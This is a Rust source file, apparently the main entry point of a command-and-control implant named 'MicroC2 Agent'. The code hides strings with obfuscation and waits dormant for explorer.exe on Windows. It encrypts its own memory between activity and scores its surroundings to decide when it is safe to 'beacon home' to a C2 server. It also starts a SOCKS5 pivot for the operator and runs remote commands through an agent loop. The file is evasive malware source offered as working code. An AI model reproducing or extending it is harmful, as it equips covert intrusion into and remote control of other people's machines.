mod commands;
mod config;
mod dormant;
mod networking;
mod opsec;
mod util;
mod state;

use crate::commands::command_shell::agent_loop;
use crate::config::AgentConfig;
use crate::networking::socks5_pivot::Socks5PivotHandler;
use crate::networking::socks5_pivot_server::Socks5PivotServer;
use crate::opsec::{AgentMode, determine_agent_mode};
use crate::state::MEMORY_PROTECTOR;
use log::{info, warn, error};
use std::env;
use std::sync::Arc;
use std::time::Duration;


// Dormant startup function
// This function is called on Windows to wait for the system to be idle before starting the agent
// It checks for the presence of explorer.exe and waits for up to 10 minutes
#[cfg(target_os = "windows")]
fn dormant_startup() {
    use sysinfo::{System, RefreshKind};
    use std::ffi::OsStr;
    use obfstr::obfstr;

    let mut sys = System::new_with_specifics(RefreshKind::everything());
    let start = std::time::Instant::now();
    // Wait up to 10 minutes or until explorer.exe is running
    while start.elapsed().as_secs() < 600 {
        sys.refresh_specifics(RefreshKind::everything());
        if sys.processes_by_name(OsStr::new(obfstr!("explorer.exe"))).next().is_some() {
            break;
        }
        std::thread::sleep(std::time::Duration::from_secs(5));
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    dormant_startup();

    env_logger::init(); // Removed for size reduction
    info!("[STARTUP] MicroC2 Agent starting...");

    let config = AgentConfig::load()?;
    info!("[CONFIG] Loaded agent config: {:?}", config);

    // Channel for pivot frames
    let (pivot_tx, mut pivot_rx) = tokio::sync::mpsc::channel(100);
    let pivot_handler = Arc::new(tokio::sync::Mutex::new(Socks5PivotHandler::new(pivot_tx.clone())));

    if config.socks5_enabled {
        info!("[CONFIG] SOCKS5 is enabled. Proxy: {}:{}, all C2 traffic will use SOCKS5 Proxy tunnel.", config.socks5_host, config.socks5_port);

        // Start SOCKS5 pivot server for operator-side pivoting
        let pivot_server = Socks5PivotServer::new(
            config.socks5_host.clone(),
            config.socks5_port,
            pivot_tx.clone(),
        );
        let pivot_handler_clone = pivot_handler.clone();
        tokio::spawn(async move {
            pivot_server.run(pivot_handler_clone).await;
        });
    } else {
        warn!("[CONFIG] SOCKS5 is disabled. Agent will use direct connection.");
    }

    // Spawn pivot frame handler in background
    let pivot_handler_bg = pivot_handler.clone();
    tokio::spawn(async move {
        while let Some(frame) = pivot_rx.recv().await {
            pivot_handler_bg.lock().await.handle_frame(frame).await;
        }
    });

    let server_addr = env::args()
        .nth(1)
        .unwrap_or_else(|| config.get_server_url());
    
    let agent_id = config.payload_id.clone();
    info!("[INFO] Agent ID: {}", agent_id);
    info!("[INFO] Using embedded configuration");

    // Start in FullOpsec mode: encrypted
    {
        let mut protector = MEMORY_PROTECTOR.lock().unwrap();
        protector.protect();
    }

    info!("[AGENT] Starting main loop. Agent ID: {}", agent_id);

    // --- Initial Opsec Check Loop (before first agent_loop call) ---
    loop {
        let current_mode = determine_agent_mode(&config);
        match current_mode {
            AgentMode::BackgroundOpsec => {
            info!("[OPSEC] Safe to beacon home. Starting agent.");
                break; // Exit this loop to start agent_loop
            }
            AgentMode::ReducedActivity => {
                info!("[OPSEC] Moderately high score. Entering ReducedActivity mode. Attempting heartbeat then sleeping longer.");
                // Unencrypt for heartbeat
                { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.unprotect(); }

                if let Err(e) = crate::commands::command_shell::send_heartbeat_with_client(&config, &server_addr, &agent_id).await {
                    error!("[OPSEC] Heartbeat failed in ReducedActivity (initial loop): {}. C2 failure counter updated internally.", e);
        } else {
                    info!("[OPSEC] Heartbeat successful in ReducedActivity (initial loop).");
                }
                
                // Ensure state is encrypted before sleep
                { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.protect(); }
                std::thread::sleep(Duration::from_secs(config.reduced_activity_sleep_secs)); 
            }
            AgentMode::FullOpsec => {
                info!("[OPSEC] Not safe to beacon home. Staying in FullOpsec (encrypted and dormant).");
                // Ensure state is encrypted (might be redundant but safe)
                { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.protect(); }
                std::thread::sleep(Duration::from_secs(5)); // Short sleep, rely on score decay/cooldown
        }
    }
    }
    // --- End Initial Opsec Check Loop ---

    // --- Main Agent Execution Loop --- 
    loop {
        // Decrypt memory before potential agent_loop call
        { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.unprotect(); }
        
        // agent_loop handles C2 comms and command execution
        if let Err(e) = agent_loop(&server_addr, &agent_id, pivot_handler.clone(), pivot_tx.clone()).await {
            error!("[ERROR] Agent loop error: {}. Preparing to re-assess OPSEC state.", e);
            // Don't immediately exit; re-encrypt and re-assess below
        }
        
        // After agent_loop returns (or if it errored), always re-encrypt
        { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.protect(); }
        info!("[OPSEC] Returned from agent_loop or error occurred. Re-encrypted. Re-assessing OPSEC state...");

        // Re-assessment Loop (similar to initial check)
        loop {
            let current_mode = determine_agent_mode(&config);
            match current_mode {
                 AgentMode::BackgroundOpsec => {
                    info!("[OPSEC] Safe to beacon home again. Resuming agent_loop.");
                    break; // Exit re-assessment loop, main loop will call agent_loop again
                }
                AgentMode::ReducedActivity => {
                    info!("[OPSEC] High score after agent activity. Entering ReducedActivity mode. Attempting heartbeat then sleeping longer.");
                    // Memory should be protected at this stage of the loop.
                    // Unencrypt for heartbeat.
                    { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.unprotect(); }

                    if let Err(e) = crate::commands::command_shell::send_heartbeat_with_client(&config, &server_addr, &agent_id).await {
                        error!("[OPSEC] Heartbeat failed in ReducedActivity (re-assessment loop): {}. C2 failure counter updated internally.", e);
            } else {
                        info!("[OPSEC] Heartbeat successful in ReducedActivity (re-assessment loop).");
                    }

                    // Re-encrypt before sleep
                    { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.protect(); }
                    std::thread::sleep(Duration::from_secs(config.reduced_activity_sleep_secs)); 
                }
                AgentMode::FullOpsec => {
                     info!("[OPSEC] High score after agent activity. Entering FullOpsec mode.");
                std::thread::sleep(Duration::from_secs(5));
                }
            }
            // Note: State remains encrypted during ReducedActivity and FullOpsec sleeps here
        }
    }
    // Ok(()) // Main loop should not exit normally
}
